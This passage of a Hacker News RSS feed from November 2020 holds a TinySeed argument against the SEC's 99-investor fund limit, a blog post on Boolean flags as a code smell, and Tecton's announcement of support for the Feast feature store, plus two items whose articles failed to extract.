href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Ftinyseed.com%2Flatest%2F99-investor-problem" target="_blank">Share on Facebook</a></p></li><li><p><a href="https://www.linkedin.com/shareArticle?mini=true&amp;source=TinySeed&amp;summary=The%20SEC%20limit%20of%2099%20investors%20on%20investment%20funds%20over%20%2410m%20has%20significant%20unintended%20consequences.%20Read%20about%20the%20issue%20and%20join%20TinySeed%20in%20support%20to%20change%20the%20law%3A%20&amp;title=&amp;url=https%3A%2F%2Ftinyseed.com%2Flatest%2F99-investor-problem">Share on LinkedIn</a></p></li></ul><p>Fund regulations and SEC rules are fairly complicated; read on for our breakdown of what everything means below:<br></p><h2>Current SEC regulatory regime for private funds</h2><h3>3(c)(1) vs. 3(c)(7)</h3><p>The SEC’s regulatory regime currently provides 2 exemptions to the (burdensome and expensive) requirement for a venture fund like ours to be registered with the SEC: 3(c)(1) and 3(c)(7).</p><p>A 3(c)(1) fund may have no more than 99 Accredited Investors, while a 3(c)(7) fund can have up to 1999 investors, but these must all be “Qualified Purchasers”. The qualified purchaser, or QP, definition is a significant increase in the required net worth compared to accredited investors.</p><h3>Why can’t investors pool their money and create a single entity to invest?</h3><p>The SEC stipulates that accredited investors cannot pool their money and create a single entity (for example through an SPV) to invest in the fund – the SEC will “look through” this entity and count the number of investors there as long as the entity was created for the purpose of making a specific investment.&nbsp;</p><h3>Why can’t we create parallel funds?</h3><p>Another often suggested option, to run several parallel funds that co-invest, is also forbidden, as the SEC will count as a single fund, any set of funds that a reasonable investor would deem to be identical.</p><h3>One burdensome option: The “QP sleeve”</h3><p>The only exception to the above is what’s sometimes referred to as a “QP sleeve”. A 3(c)(1) fund may operate in parallel with a separate 3(c)(7) fund. This does add significant overheads, but frees up some slots for accredited investors by moving the qualified purchasers into the 3(c)(7) (of which there can be 1999).</p><h3>The recent JOBS act</h3><p>A more recent change was introduced with the JOBS act, which expanded the ability of fund managers to promote their offerings publicly, with the trade-off that doing so would tighten the requirement to verify that all investors were in fact accredited investors (a 506c offering). We think these changes are laudable, as they increase awareness of specific offerings among accredited investors while also adding further, appropriate, protections.</p><h2>Recent regulatory efforts to expand investment opportunities, harmonize regulations with other jurisdictions and further capital formation</h2><p>&nbsp;The SEC very recently issued updated accredited investor definitions: </p><blockquote><p>For the first time, individuals will be permitted to participate in our private capital markets not only based on their income or net worth, but also based on established, <strong><em>clear measures of financial sophistication</em></strong>.</p></blockquote><p>(Emphasis ours.)</p><p>We salute this change, and even though we think the SEC has further to go in terms of widening the definition of accredited investors, it’s a great first step. This change is well inline with the SECs ongoing efforts to “simplify, harmonize, and improve the exempt offering framework, thereby expanding investment opportunities while maintaining appropriate investor protections and promoting capital formation.”</p><p><strong>&nbsp;However, we believe that the current limit of 99 accredited investors per 3(c)(1) fund runs counter to these efforts.</strong></p><h2>The many downsides of the 99 accredited investor limit</h2><p>The current limit of 99 accredited investors <strong>hurts capital formation</strong>, <strong>reduces investment opportunities</strong>,&nbsp; <strong>increases the risk to individual investors</strong> and <strong>decreases access to private capital markets for underrepresented groups</strong>.</p><ul data-rte-list="default"><li><p>A fund manager can accept smaller checks from wealthier individuals, as the higher QP limit in the sleeve means that there is effectively no minimum amount required of those individuals. </p></li><li><p>Conversely, and perversely, a fund manager looking to raise a more substantial fund is forced to ask for larger checks from the less wealthy investor, or keep that investor out of the fund entirely.</p></li></ul><p><strong>This is far from ideal and, in our experience, excludes sophisticated investors from being allowed to invest in funds like ours. </strong>In some cases these excluded investors have a deep understanding of the industry being invested into, and perhaps with atypical backgrounds as far as fund investors go. <strong>We do not believe those kinds of investors should be effectively excluded from making these kinds of investments.</strong></p><p>Instead what happens is that as funds grow from very small (sub $10m) they are forced to seek capital from larger, institutional investors like Fund of Funds, Endowments and various Family Offices.</p><p><strong>While these more institutional LPs are a fine source of capital, it’s undoubtedly true that they are more risk averse and in general prone to relying on a proven track record for the managers they back.&nbsp;</strong></p><p>A great example of this is the University of Texas’ (laudable) Emerging Managers Program. This is a program setup explicitly to support new (aka emerging) managers, though the criteria for selection includes:</p><ul data-rte-list="default"><li><p>Attributable track record within target strategy</p></li><li><p>Investment teams with history of working together</p></li><li><p>Principals known in the investment community and are positively referenceable</p></li></ul><p><strong>Clearly, such terms favor managers that “emerge” from existing funds.</strong> This means that the type of general partners that more easily get backing from these kinds of investors are of the same mold as GPs that already exist.<strong> New and diverse GPs with novel ways to invest are effectively locked into staying small or violating SEC rules.</strong></p><h2>Proposed solution: <br><strong>Allow as many Accredited Investors as Qualified Purchasers.</strong></h2><p>The oversight of private funds is light by definition, so we fully understand why the SEC imposes a limit on the number of investors. Without a limit, a fraudulent fund could become a significant issue if tens or hundreds of thousands of investors could invest.&nbsp;</p><p><strong>However, we feel the unintended consequences of concentrating wealth creation to only super high net worth individuals or institutional investors with the 99 Accredited Investors limit is not the right trade-off in this regard.</strong> We propose that private funds relying on the 3(c)(1) exemption should be allowed to admit up to 1999 accredited investors, assuming they are required to make reasonable efforts to verify that investors are in fact accredited (something that is already a requirement for a 506c offering.)</p><h3><strong>If you are an emerging manager or stakeholder who would like to see the 99 investor limit raised, send us an email at </strong><a href="mailto:hello@tinyseed.com"><strong>hello@tinyseed.com</strong></a><strong>.</strong></h3><p><strong>Please help raise awareness of this issue:</strong></p><ul data-rte-list="default"><li><p><a href="https://twitter.com/intent/tweet?text=The%20SEC%20limit%20of%2099%20investors%20on%20investment%20funds%20over%20%2410m%20has%20significant%20unintended%20consequences.%20Read%20about%20the%20issue%20and%20join%20TinySeed%20in%20support%20to%20change%20the%20law%3A%20https%3A%2F%2Ftinyseed.com%2Flatest%2F99-investor-problem%20" target="_blank">Share on Twitter</a></p></li><li><p><a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Ftinyseed.com%2Flatest%2F99-investor-problem" target="_blank">Share on Facebook</a></p></li><li><p><a href="https://www.linkedin.com/shareArticle?mini=true&amp;source=TinySeed&amp;summary=The%20SEC%20limit%20of%2099%20investors%20on%20investment%20funds%20over%20%2410m%20has%20significant%20unintended%20consequences.%20Read%20about%20the%20issue%20and%20join%20TinySeed%20in%20support%20to%20change%20the%20law%3A%20&amp;title=&amp;url=https%3A%2F%2Ftinyseed.com%2Flatest%2F99-investor-problem" target="_blank">Share on LinkedIn</a></p></li></ul></div></div></div>]]>
            </description>
            <link>https://tinyseed.com/latest/99-investor-problem</link>
            <guid isPermaLink="false">hacker-news-small-sites-25132612</guid>
            <pubDate>Wed, 18 Nov 2020 02:43:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Flags Are a Code Smell]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25132249">thread link</a>) | @spekcular
<br/>
November 17, 2020 | https://www.sebastiansylvan.com/post/2014-04-27-flags-are-a-code-smell/ | <a href="https://web.archive.org/web/*/https://www.sebastiansylvan.com/post/2014-04-27-flags-are-a-code-smell/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
            
            
            
            	<span>
                	<span><sup>27</sup></span><span>/</span><span>Apr</span> <span>2014</span>
            	</span>
            	
            
            	
            

			
			

			

			

            

<p>In most major code bases, it’s common to have objects with lots of Boolean flags indicating what state they’re in. E.g. is an enemy targeting the player or not? Is it trying to flee or not? If you have a set of mutually exclusive flags an enum can be used instead, but this is often not possible, and doesn’t change much in terms of the downsides.</p>

<p>In my opinion these are code smells. Smells don’t <em>necessarily</em> indicate actual issues, just patterns that are likely to be used incorrectly and thus warrants extra care.</p>

<p>In many cases if you think about how to avoid flags you’re forced change the code in ways that result in clearer code (specifically several simple functions rather than one general function that checks a dozen flags), as well as improved performance due to fewer branches and cache misses. Let me stress that the main gain here is the improved code quality, so don’t be fooled into thinking this is some kind of optimization – better performance is a happy side effect. And yes, there are cases where flags are the clearer option as well (see below).</p>

<h2 id="an-example">An example</h2>

<p>For a somewhat contrived example, consider a game rendering system. Each object in the world has some rendering state associated with it, this would be things like what meshes and materials to use, but also various flags determining how it’s to be rendered.</p>

<p>Let’s say we have a flag called isDynamic, which tells us if the object can move or if it’s static. We can change the flag throughout the life of the object, but when it’s set to false we assume it’s going to be static for some time (so we pay some up-front cost to pre-calculate some acceleration structures that pay off during actual rendering).</p>

<p>Sometimes you want to temporarily toggle rendering for an object so we check this in the renderer as well by adding an isVisible flag.</p>

<p>In addition, the object as a whole may have an isEnabled flag which lets us disable the whole object (physics, animation, rendering all ignore it when it’s not enabled).</p>

<p>Ok, so far we have three flags which means we have 23 = 8 possible combinations of flags, but do we really have eight separate <em>legal</em> states? No! E.g. an object which is not enabled can’t be visible. You could also argue that an object which is disabled or invisible is _neither _dynamic nor static. So we have significantly more <em>possible</em> states than <em>legal</em> states, and it’s very easy to accidentally end up in an illegal state by forgetting to check a flag in one of the many branches throughout the renderer (e.g. perhaps you go down the “isDynamic” branch somewhere for an object which is invisible, thus getting yourself into an inconsistent state). As you add more flags the set of possible states explodes, and it’s common for the interdependencies to be complex and easy to mess up in all the places you have to check.</p>

<h2 id="an-alternative">An alternative</h2>

<p>Instead of storing all these flags, take a step back and think about what the point of each flag is. The isDynamic flag is there to distinguish between dynamic and static objects. A different way of doing this is for the renderer to simply keep an array of dynamic objects and an array of static objects.</p>

<p>The isVisible flag is different. It means the object should be in <em>neither</em> the dynamic or static array. For the whole-object enabled flag we can do something similar, but for each sub-system.</p>

<p>The exact way you avoid any given flag will differ depending on what the purpose of the flag is, but you can usually find a way to avoid it._
        _</p>

<p>So that’s the point of all this? Well the main benefit is that all the code spread out through the renderer can now be simpler. Instead of checking flags for a complicated set of legal states all over the code, we just have completely separate functions for each kind of state. E.g. there’s one method to go through all the static objects and render them, another to go through all the dynamic ones. These functions may call into shared helper functions here and there (to avoid duplication), but if you want to know how dynamic objects get rendered there’s a single place to start reading, and it will be easier to understand because the code is handling fewer cases.</p>

<p>The complexity isn’t entirely gone, it’s just moved. It’s now in methods like “SetVisible”, “SetDynamic” and so on. This is far better, since the complexity is now <em>localized</em>, making it easier to ensure correctness.</p>

<p>A brief note on performance: As we’re now separating things into different arrays to keep the logic clearer, you can often also split the data up across different arrays, which improves the cache locality for the functions that deal with that particular part of the state. For example, objects may use different data if they’re static or dynamic so if you can avoiding have to “step over” the static data in the dynamic code-path that’s going to save lots of cache misses.</p>

<h2 id="what-about-checking-which-state-an-object-is-in">What about checking which state an object is in?</h2>

<p>If you use the proposed scheme most code never actually have to check any per-object flags, because the data already comes pre-sorted to the “processing” code (and is kept sorted by the state transition code). However, there are exceptions. Sometimes you really do want to check what state a specific object is in. This means doing an array lookup for each of the different arrays to see if the object is there.</p>

<p>To make this fast, you could store the index for each array in the object, which gives you fast lookups. This does means you’re still storing state-related information in the object itself (one index per array), but it can be <em>private</em> information so you still get the other benefits - the renderer still doesn’t have to check flags.</p>

<p>Another option is to make sure each object uses the <em>same</em> index in all the arrays it’s in. You generate a unique ID for each object, and use this as the location for the object in all arrays. The obvious way to do this is to allocate MAX_OBJECT_COUNT-sized arrays for all possible states, but that can of course be wasteful (and costly - gaps in the array cost cache misses when traversing). A better way is to use a “sparse array”, which only stores objects that are actually in the array, but still allows O(1) lookup. A hash table is a reasonable backing-store for this, but you can do better if you let your IDs be unique ints with uniform distribution (no need to actually hash anything, use the ID as-is in a <a href="http://sebastiansylvan.com/2013/05/08/robin-hood-hashing-should-be-your-default-hash-table-implementation/">Robin-hood style</a> hash table).</p>

<h2 id="when-not-to-use-this">When not to use this</h2>

<p>I said above that flags are a code smell, not code bugs! There’s plenty of cases where using flags is entirely appropriate. E.g. if you set flags multiple times per frame then the increased cost of moving it between different arrays all the time is likely a bad idea. Also, if you use the sparse array idea above checking a flag is a lot more expensive so if you do this frequently you should probably at least cache the result of this lookup in a flag. Another scenario is if you only have one of something, there’s really no reason to have multiple arrays in that case, since most arrays will be empty. Also, sometimes the added cognitive overhead of multiple arrays just isn’t worth it if the code is trivial. Last but not least, sometimes it’s just damn difficult to figure out how to avoid a flag and spending too much effort jumping through hoops to satisfy some rule of thumb is just dogmatic.</p>

<p>Even if you go with the suggested approach above, you may still need an actual flag to handle the state transitions appropriately. E.g. if you make an object visible after it’s been invisible you probably need to know if you should add it to the dynamic or static array now that it’s visible. The point isn’t to have no flags at all (despite the title), it’s to move the resulting complexity to the code that actually deals with the _state transition_s, instead of spreading (and duplicating) that same complexity all over the code.</p>

<h2 id="more-resources">More resources</h2>

<p>If this approach appeals to you, you really should look into data-oriented design. I’m a fan of this approach (first and foremost consider the data, and how it gets processed, don’t obsess over object identity), but I would advocate moderation. There are often benefits to having some of the state <em>with</em> the object, instead of having everything be implicit based on what component arrays it’s in (in terms of readability, and sometimes even performance). Resist the temptation to be an extremist about this, that’s really no different than the programmer who uses design patterns every chance they get.</p>

<p>For more on data oriented design, check out <a href="http://www.dataorienteddesign.com/dodmain/">http://www.dataorienteddesign.com/dodmain/</a> .</p>

<p>Another good intro to this and other things, from a performance perspective is “Code Clinic: How to Write Code the Compiler can Actually Optimize” by Mike Acton at GDC 2014 (available at the GDC vault with membership – you really need to see the talk here though, slides alone aren’t enough).</p>

<p>Another practical case study is <a href="http://research.scee.net/files/presentations/gcapaustralia09/Pitfalls_of_Object_Oriented_Programming_GCAP_09.pdf">Pitfalls of Object Oriented Programming</a> by Tony Albrecht.</p>



	
			

			

			
				
            
          </section></div>]]>
            </description>
            <link>https://www.sebastiansylvan.com/post/2014-04-27-flags-are-a-code-smell/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25132249</guid>
            <pubDate>Wed, 18 Nov 2020 01:47:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Run x86 Apps (including homebrew) in the Terminal on Apple Silicon]]>
            </title>
            <description>
<![CDATA[
Score 220 | Comments 134 (<a href="https://news.ycombinator.com/item?id=25132217">thread link</a>) | @JoshuaMulliken
<br/>
November 17, 2020 | https://www.notion.so/Run-x86-Apps-including-homebrew-in-the-Terminal-on-Apple-Silicon-8350b43d97de4ce690f283277e958602 | <a href="https://web.archive.org/web/*/https://www.notion.so/Run-x86-Apps-including-homebrew-in-the-Terminal-on-Apple-Silicon-8350b43d97de4ce690f283277e958602">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.notion.so/Run-x86-Apps-including-homebrew-in-the-Terminal-on-Apple-Silicon-8350b43d97de4ce690f283277e958602</link>
            <guid isPermaLink="false">hacker-news-small-sites-25132217</guid>
            <pubDate>Wed, 18 Nov 2020 01:41:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Applied Pokology – GNU poke development news]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25131902">thread link</a>) | @pabs3
<br/>
November 17, 2020 | http://jemarch.net/pokology-20201115.html | <a href="https://web.archive.org/web/*/http://jemarch.net/pokology-20201115.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://jemarch.net/pokology-20201115.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25131902</guid>
            <pubDate>Wed, 18 Nov 2020 00:52:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why Tecton Is Backing the Feast Open Source Feature Store]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25131539">thread link</a>) | @amargvela
<br/>
November 17, 2020 | https://www.tecton.ai/blog/feast-announcement/ | <a href="https://web.archive.org/web/*/https://www.tecton.ai/blog/feast-announcement/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-id="5dd09226" data-element_type="widget" data-widget_type="theme-post-content.default">
				<div>
			
<hr>



<p>Today, we’re excited to announce that Tecton is becoming a core contributor to the <a href="http://feast.dev/">Feast</a> open source feature store, and that Willem Pienaar, creator of Feast, is joining the Tecton team. In other words, we’re strong believers in the Feast project and are investing meaningful resources into its success. We share a joint vision with Willem: enable every organization to operationalize ML at scale by allowing teams to build and deploy features quickly and reliably.</p>



<p>If you’ve been following Tecton, you know that we’re also building our own commercial feature store that’s currently in early access and soon-to-become Generally Available. And this naturally raises a few questions: why invest in two feature stores, and what does this mean for both Feast and the Tecton feature store?</p>







<h2>Making Feature Stores Accessible to Every Organization</h2>



<p>We believe that feature stores are an essential part of the modern ML stack because they solve the hardest problem of productionizing operational ML: getting fresh feature data reliably computed and served into production. As discussed in <a href="https://www.tecton.ai/blog/what-is-a-feature-store/">“What is a Feature Store?”</a>, a feature store solves this problem by managing feature transformation pipelines, storing features, and serving features in production. The Tecton founding team saw the need for a feature store at Uber where we built the Michelangelo project. Similarly, other technology companies like Gojek also realized the importance of feature stores, leading to the development of Feast.</p>



<p>Unfortunately, feature stores have up to now been accessible only to the largest, most sophisticated technology companies that have the skills and resources to build their own infrastructure.</p>



<p>For the rest of the industry, this technology has remained mostly out of reach. Building your own feature store requires dedicated teams of highly skilled engineers and multiple years of development time. Our objective is to change this, and to put feature stores in reach of every organization, regardless of their ML maturity and available commercial resources.</p>







<h2>Freedom to Choose Between Open Source and Commercial Software</h2>



<p>We have seen strong demand for teams to enter the early access program we introduced earlier this year. We’ve partnered with customers ranging from small growth-stage startups to large Fortune 50 companies, across North America and Europe. We now have customers like <a href="https://2b838p24nks2163of0383y6z-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/Atlassian-Case-Study-201006.pdf">Atlassian</a> running at production scale on the Tecton enterprise feature store.</p>



<p>Along the way, we’ve learned that user needs vary significantly based on their level of maturity, size, and resources. Cloud services are preferred by larger teams that are operationalizing ML at scale and need to move fast, offload the burden of managing and updating software, and have guaranteed service levels with enterprise support. On the other hand, open source is highly valued by small ML teams that are just starting out and want to get their hands dirty, and by large organizations that need to customize the software to their specific needs and have the resources and skills to self-manage their ML infrastructure.</p>



<p>Our objective at Tecton is to solve the data problem for Operational ML for all organizations. The Tecton enterprise feature store is only available as a managed cloud service, leaving a gap for organizations that need open source software today. To close the gap, we decided to put significant resources behind Feast. Partnering with the Feast project, our plan is to leverage our existing development efforts in and learnings from Tecton to help make Feast the best open source feature store, both for small teams just starting out and for larger teams that need the flexibility of open source. As strong allies, we’re going to advance the state of the art for feature stores and enable their adoption across the industry.</p>







<h2>Feast: The Leading Open Source Feature Store</h2>



<p>Feast was developed jointly by Gojek and Google Cloud, and <a href="https://cloud.google.com/blog/products/ai-machine-learning/introducing-feast-an-open-source-feature-store-for-machine-learning">first announced</a> about two years ago. Since its initial release in 2019, Feast has grown rapidly, with multiple companies, including Microsoft, Agoda, Farfetch, Postmates and Zulily adopting and/or contributing to the project. Today, the project has more than 1,100 GitHub stars and has been adopted as a <a href="https://www.kubeflow.org/docs/components/feature-store/">component in Kubeflow</a>.</p>



<p>Willem and the Feast contributors have a clear <a href="https://blog.feast.dev/post/a-state-of-feast">vision</a> of where they want to take the project, and that vision is very well aligned with Tecton’s vision.</p>



<p>Feast will remain a completely independent project, <a href="https://lfaidata.foundation/blog/2020/11/10/feast-joins-lf-ai-data-as-new-incubation-project/">managed by the LF AI &amp; Data Foundation</a>. Willem will continue to be fully committed to Feast, and an official maintainer of the project. And of course, Feast continues to welcome new users and contributors. If you want to learn more or are looking to use Feast: please check out their resources and get involved!</p>



<ul><li>Project website: <a href="http://feast.dev/">feast.dev</a></li><li>Slack channel: <a href="https://join.slack.com/t/kubeflow/shared_invite/zt-cpr020z4-PfcAue_2nw67~iIDy7maAQ">#Feast</a></li><li>Documentation: <a href="https://docs.feast.dev/">docs.feast.dev</a></li><li>GitHub repository: <a href="https://github.com/feast-dev/feast">feast-dev/feast</a></li></ul>







<h2>Feast and Tecton: Deployment and Support</h2>



<p>Tecton and Feast’s differences are most notable on how they’re deployed and managed: Feast is fully open source and self-managed. Tecton is a fully-managed cloud service and can be deployed into a company’s private VPC, or into a Tecton-provided single-tenant SaaS environment. While Feast got started on GCP and Tecton got started on AWS, both will support GCP, AWS and Azure in 2021.</p>







<figure><table><tbody><tr><td></td><td><strong>Feast</strong></td><td><strong>Tecton</strong></td></tr><tr><td><strong>License</strong></td><td>Open Source, Apache 2.0</td><td>Enterprise</td></tr><tr><td><strong>Deployment model</strong></td><td>Self-managed via Kubernetes Helm Charts</td><td>Hosted SaaS<br>Private VPC</td></tr><tr><td><strong>Management</strong></td><td>Self-managed</td><td>Fully-managed<br><ul><li>Automatic upgrades</li><br><li>Automatic security patches</li></ul></td></tr><tr><td><strong>SLAs</strong></td><td>N/A</td><td>SLA includes:<br><ul><li>Up-time</li><br><li>Feature Serving Latency</li><br><li>Support ticket and bug fix response time</li></ul></td></tr><tr><td><strong>Support</strong></td><td>Community</td><td>24/7 on-call<br>Slack</td></tr><tr><td><strong>Cloud platforms</strong></td><td>Amazon Web Services<br>Google Cloud Platform<br>Azure (Q1 2021)</td><td>Amazon Web Services<br>GCP (2021)<br>Azure (2021)</td></tr></tbody></table></figure>







<h2>Feast and Tecton: Capabilities</h2>



<p>Tecton and Feast have independent roots and were started by different companies. Tecton’s capability set is largely a superset of Feast’s, with a strong focus on fully-fledged transformation support and enterprise capabilities:</p>



<figure><img src="https://2b838p24nks2163of0383y6z-wpengine.netdna-ssl.com/wp-content/uploads/2020/11/Feast-_-Tecton.svg" alt="" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></figure>







<p>Beyond Feast’s capabilities, Tecton’s proprietary capabilities are going to focus on data governance, advanced collaboration and operational excellence.</p>



<p>Here’s a more detailed overview of the projects’ capabilities:</p>







<figure><table><tbody><tr><td></td><td><strong>Feast</strong></td><td><strong>Tecton</strong></td></tr><tr><td><strong>Precomputed Feature Ingestion</strong></td><td>Batch Ingest<br>Stream Ingest</td><td>Batch Ingest<br>Stream Ingest<br>RPC Ingest</td></tr><tr><td><strong>Feature Transformations</strong></td><td>Coming in 2021</td><td>Batch<br>Streaming<br>On-Demand</td></tr><tr><td><strong>Storage</strong></td><td>Offline feature store<br>Online feature store</td><td>Offline feature store<br>Online feature store</td></tr><tr><td><strong>Serving</strong></td><td>Online Serving API<br>Offline Serving with point-in-time time travel</td><td>Online Serving API<br>Offline Serving with point-in-time time travel</td></tr><tr><td><strong>Monitoring</strong></td><td>Operational Health Monitoring</td><td>Operational Health Monitoring<br>Feature Drift detection<br>Data Quality Monitoring<br>Prometheus integration</td></tr><tr><td><strong>Web-UI</strong></td><td>Coming in 2021</td><td>Available</td></tr><tr><td><strong>Data Governance &amp; Security</strong></td><td>OAuth2</td><td>Fine-grained access control<br>SSO via SAML<br>Audit Logging</td></tr><tr><td><strong>CI/CD Pipeline Integration</strong></td><td>Coming in 2021</td><td>Supported via CLI</td></tr><tr><td><strong>Feature Versioning and Reproducibility</strong></td><td><img src="https://2b838p24nks2163of0383y6z-wpengine.netdna-ssl.com/wp-content/uploads/2020/11/checkmark-1.svg" alt="" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></td><td><img alt="" data-src="https://2b838p24nks2163of0383y6z-wpengine.netdna-ssl.com/wp-content/uploads/2020/11/checkmark-1.svg" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></td></tr><tr><td><strong>Feature Testing</strong></td><td><img src="https://2b838p24nks2163of0383y6z-wpengine.netdna-ssl.com/wp-content/uploads/2020/11/x-out.svg" alt="" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></td><td><img alt="" data-src="https://2b838p24nks2163of0383y6z-wpengine.netdna-ssl.com/wp-content/uploads/2020/11/checkmark-1.svg" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></td></tr><tr><td><strong>Cost Controls</strong></td><td><img alt="" data-src="https://2b838p24nks2163of0383y6z-wpengine.netdna-ssl.com/wp-content/uploads/2020/11/x-out.svg" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></td><td><img alt="" data-src="https://2b838p24nks2163of0383y6z-wpengine.netdna-ssl.com/wp-content/uploads/2020/11/checkmark-1.svg" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></td></tr><tr><td><strong>Autoscaling</strong></td><td><img alt="" data-src="https://2b838p24nks2163of0383y6z-wpengine.netdna-ssl.com/wp-content/uploads/2020/11/x-out.svg" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></td><td><img alt="" data-src="https://2b838p24nks2163of0383y6z-wpengine.netdna-ssl.com/wp-content/uploads/2020/11/checkmark-1.svg" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></td></tr><tr><td><strong>High Availability</strong></td><td><img alt="" data-src="https://2b838p24nks2163of0383y6z-wpengine.netdna-ssl.com/wp-content/uploads/2020/11/checkmark-1.svg" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></td><td><img alt="" data-src="https://2b838p24nks2163of0383y6z-wpengine.netdna-ssl.com/wp-content/uploads/2020/11/checkmark-1.svg" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></td></tr><tr><td><strong>Disaster Recovery</strong></td><td><img alt="" data-src="https://2b838p24nks2163of0383y6z-wpengine.netdna-ssl.com/wp-content/uploads/2020/11/x-out.svg" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></td><td><img alt="" data-src="https://2b838p24nks2163of0383y6z-wpengine.netdna-ssl.com/wp-content/uploads/2020/11/checkmark-1.svg" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></td></tr></tbody></table></figure>







<h2>Offering a seamless migration between Tecton and Feast</h2>



<p>Often, the preferences between using a managed enterprise offering and a self-managed open source project change over time. An enterprise using Tecton’s managed offering may eventually require greater customizability and prefer to switch to a custom fork of Feast. Similarly, a small team that got started with Feast may eventually desire the enterprise capability and managed service of Tecton. To simplify transitions, Tecton is committed to providing a simple migration path between both projects. This migration path will eventually be enabled via:</p>



<ul><li><strong><strong>Feature Serving API Parity:</strong></strong> The feature serving APIs will be identical, allowing customers to switch between both feature stores without having to modify the feature store clients. Model training notebooks and prediction services running in production can remain largely unchanged as long as the client points at the new Feature Store backend.</li><li><strong><strong>Feature Definition Parity: </strong></strong>Tecton’s feature definition DSL will be a superset of Feast’s DSL. As a result, Feast feature definitions can seamlessly be applied to a Tecton deployment.</li><li><strong><strong>Feature Store Parity: </strong></strong>Tecton and Feast will support the same offline and online feature storage technologies (e.g. S3, Delta, DynamoDB, Redis etc.) and understand the same storage contract. As a result, no physical data will need to be migrated as customers choose to migrate between both projects.</li></ul>







<h2>Want to learn more?</h2>



<p>If you’re now embarking on a journey to operationalize ML and wondering, first, whether you need a feature store and, second, whether Tecton or Feast is the right choice for you, we’d love to speak with you. We’re obviously big fans of both the Feast and Tecton feature stores, and can guide you to the best option based on your specific needs. Please get in touch at <a href="mailto:hello@tecton.ai">hello@tecton.ai</a> or sign up for <a href="http://tecton.ai/">a demo</a> and we’ll be in touch soon.</p>
		</div>
				</div></div>]]>
            </description>
            <link>https://www.tecton.ai/blog/feast-announcement/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25131539</guid>
            <pubDate>Wed, 18 Nov 2020 00:00:54 GMT</pubDate>
        </item>
    </channel>
</rss>
